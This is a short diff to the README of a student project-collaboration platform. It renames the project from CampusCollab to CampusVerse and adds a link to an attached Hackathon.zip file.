@@ -1,4 +1,4 @@
-# CampusCollab - Project Collaboration Platform
+# CampusVerse - Project Collaboration Platform
 
 CampusCollab is a web platform designed to help students find teammates, post project ideas, join ongoing projects, and stay updated with events and activity feeds within their campus community.
 
@@ -21,3 +21,6 @@ This platform includes:
 | Firebase Authentication | User Login & Account Handling |
 | Firebase Firestore      | Storing Ideas & Project Data  |
 | Tailwind CSS            | Styling                       |
+
+
+[Hackathon.zip](https://github.com/user-attachments/files/23435551/Hackathon.zip)
